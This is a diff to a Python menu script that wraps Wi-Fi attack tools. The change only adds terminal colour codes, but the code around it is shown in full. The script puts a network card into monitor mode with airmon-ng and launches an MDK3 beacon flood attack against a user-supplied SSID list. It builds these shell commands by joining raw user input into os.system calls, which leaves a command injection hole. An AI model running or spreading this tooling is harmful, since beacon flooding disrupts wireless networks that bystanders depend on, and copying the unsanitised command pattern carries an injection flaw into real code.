@@ -2,36 +2,36 @@ import os
 
 def main():
     os.system("clear")
-    print('''
+    print('''\u001b[31;1m
     ╔═════════════════════════════╗
-    ║ v!e = Enable Monitor Mode   ║           
+    ║ \u001b[37;1mv!e \u001b[31;1m= \u001b[32;1mEnable Monitor Mode   \u001b[31;1m║           
     ║                             ║
-    ║ v!d = Disable Monitor Mode  ║
+    ║ \u001b[37;1mv!d \u001b[31;1m= \u001b[32;1mDisable Monitor Mode  \u001b[31;1m║
     ║                             ║
-    ║ v!f = MDK3 Flood Attack     ║
+    ║ \u001b[37;1mv!f \u001b[31;1m= \u001b[32;1mMDK3 Flood Attack     \u001b[31;1m║
     ║                             ║
-    ║ v!u = Update Packages       ║
+    ║ \u001b[37;1mv!u \u001b[31;1m= \u001b[32;1mUpdate Packages       \u001b[31;1m║
     ╚═════════════════════════════╝''')
-    shell = input("shell~$ ")    
+    shell = input("\u001b[36;1mshell~$ \u001b[37;1m")    
     if shell == "v!e":
         os.system("clear")
-        card = input("Enter Network Card: ")
+        card = input("\u001b[34;1mEnter Network Card: ")
         os.system("sudo airmon-ng start " + card)
         os.system("clear")
         main()
 
     if shell == "v!d":
         os.system("clear")
-        card = input("Enter Network Card: ")
+        card = input("\u001b[34;1mEnter Network Card: ")
         os.system("sudo airmon-ng stop " + card)
         os.system("clear")
         main()
 
     if shell == "v!f":
         os.system("clear")
-        card = input("Enter Network Card: ")
-        ssid = input("Enter SSID List: ")
-        print("MDK3 Flood Attack Has Started! (CTRL + C = STOP)")
+        card = input("\u001b[34;1mEnter Network Card: ")
+        ssid = input("\u001b[34;1mEnter SSID List: ")
+        print("\u001b[32;1mMDK3 Flood Attack Has Started! (CTRL + C = STOP)")
         os.system("sudo mdk3 " + card + " b -a -v " + ssid + " -s 99999")
 
     if shell == "v!u":
